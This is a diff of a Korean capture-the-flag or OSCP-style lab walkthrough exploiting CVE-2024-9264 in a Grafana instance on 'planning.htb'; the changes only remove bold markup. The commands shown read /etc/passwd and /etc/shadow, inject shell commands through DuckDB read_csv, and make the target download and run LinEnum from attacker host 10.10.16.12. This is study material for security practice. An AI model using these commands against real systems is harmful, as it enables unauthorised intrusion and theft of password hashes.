@@ -238,7 +238,7 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM re
 
 --------------- 정리
 
-OSCP 해킹 과정의 **완전한 데이터 흐름**과 **명령어 분석**을 상세히 설명드리겠습니다.
+OSCP 해킹 과정의 완전한 데이터 흐름과 명령어 분석을 상세히 설명드리겠습니다.
 
 ## 완전한 공격 시나리오 분석
 
@@ -249,25 +249,25 @@ OSCP 해킹 과정의 **완전한 데이터 흐름**과 **명령어 분석**을 
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `wget`: HTTP/HTTPS로 파일 다운로드하는 도구
-- `https://raw.githubusercontent.com/...`: GitHub에서 직접 원본 파일 URL
+- `https://raw.githubusercontent.com..`: GitHub에서 직접 원본 파일 URL
 - `-O linenum.sh`: 다운로드한 파일을 'linenum.sh'로 저장
-- **LinEnum**: Linux 시스템의 권한 상승 가능성을 찾는 자동화 스크립트
+- LinEnum: Linux 시스템의 권한 상승 가능성을 찾는 자동화 스크립트
 
 ```bash
 # HTTP 웹 서버 실행 (파일 전송 준비)
 python3 -m http.server 8000
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `python3 -m http.server`: Python 내장 HTTP 서버 모듈 실행
 - `8000`: 리스닝 포트 번호
-- **목적**: 현재 디렉토리의 파일들을 HTTP로 제공 (linenum.sh 전송용)
+- 목적: 현재 디렉토리의 파일들을 HTTP로 제공 (linenum.sh 전송용)
 
-**현재 디렉토리 상태:**
+현재 디렉토리 상태:
 
 ```
 /root/exploit/
@@ -285,23 +285,23 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM re
 
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `-u admin`: Grafana 사용자명
 - `-p 0D5oT70Fq13EvB5r`: Grafana 비밀번호
 - `-q`: SQL 쿼리 모드 (DuckDB 쿼리 직접 실행)
 - `read_blob('/etc/passwd')`: 파일 내용을 바이너리로 읽는 DuckDB 함수
-- **목적**: 시스템 사용자 계정 정보 확인
+- 목적: 시스템 사용자 계정 정보 확인
 
 ```bash
 # 타겟의 /etc/shadow 파일 읽기 (패스워드 해시 정보)
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/shadow')" http://grafana.planning.htb
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `/etc/shadow`: Linux 시스템의 암호화된 패스워드 저장 파일
-- **목적**: 패스워드 크래킹을 위한 해시 값 수집
+- 목적: 패스워드 크래킹을 위한 해시 값 수집
 
 ### 3단계: 파일 전송 (Kali → 타겟)
 
@@ -310,13 +310,13 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM re
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.12:8000/linenum.sh" http://grafana.planning.htb
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `-c`: 명령어 실행 모드 (Command execution)
 - `wget http://10.10.16.12:8000/linenum.sh`: 공격자 웹 서버에서 파일 다운로드
-- **데이터 흐름**: `[Kali HTTP Server] → [Network] → [Target /root/]`
+- 데이터 흐름: `[Kali HTTP Server] → [Network] → [Target /root/]`
 
-**내부 동작 과정:**
+내부 동작 과정:
 
 ```sql
 -- CVE 익스플로잇이 생성하는 실제 DuckDB 쿼리
@@ -326,7 +326,7 @@ LOAD shellfs;
 SELECT * FROM read_csv('wget http://10.10.16.12:8000/linenum.sh >/tmp/grafana_cmd_output 2>&1 |');
 ```
 
-**실행 결과 분석:**
+실행 결과 분석:
 
 ```
 [+] Logged in as admin:0D5oT70Fq13EvB5r        # Grafana 로그인 성공
@@ -355,7 +355,7 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "chmod +x linenum.sh.3"
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "./linenum.sh.3 > /tmp/enum_result.txt 2>&1" http://grafana.planning.htb
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `./linenum.sh.3`: 다운로드한 스크립트 실행
 - `> /tmp/enum_result.txt`: 표준 출력을 파일로 리다이렉션
@@ -375,16 +375,16 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la /tmp/enum_resul
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/tmp/enum_result.txt')" http://grafana.planning.htb
 ```
 
-**명령어 분석:**
+명령어 분석:
 
 - `/tmp/enum_result.txt`: LinEnum 스크립트 실행 결과가 저장된 파일
-- **목적**: 권한 상승 가능한 취약점들을 분석
+- 목적: 권한 상승 가능한 취약점들을 분석
 
 ## 데이터 흐름 완전 분석
 
 ### 파일 저장 위치 맵핑
 
-**공격자 시스템 (Kali - 10.10.16.12):**
+공격자 시스템 (Kali - 10.10.16.12):
 
 ```
 /root/exploit/
@@ -393,7 +393,7 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM re
 └── cookies.txt             # Grafana 세션 쿠키
 ```
 
-**타겟 시스템 (Ubuntu - 10.10.11.68):**
+타겟 시스템 (Ubuntu - 10.10.11.68):
 
 ```
 /root/
@@ -427,9 +427,9 @@ SELECT content FROM read_blob('/tmp/grafana_cmd_output');
 
 #### 취약점 발생 지점
 
-- **read_csv()** 함수의 **파라미터 인젝션**
-- 파일 경로 대신 **쉘 명령어**가 실행됨
-- **파이프(|)** 연산자로 명령 체이닝 가능
+- read_csv() 함수의 파라미터 인젝션
+- 파일 경로 대신 쉘 명령어가 실행됨
+- 파이프(|) 연산자로 명령 체이닝 가능
 
 ## 다음 단계 권장사항
 
@@ -453,7 +453,7 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name user.txt 
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name root.txt -type f 2>/dev/null" http://grafana.planning.htb
 ```
 
-이 과정을 통해 **완전한 시스템 장악**과 **지속적인 액세스**가 가능해집니다.
+이 과정을 통해 완전한 시스템 장악과 지속적인 액세스가 가능해집니다.
 
 ### ENVIRONMENTAL
 
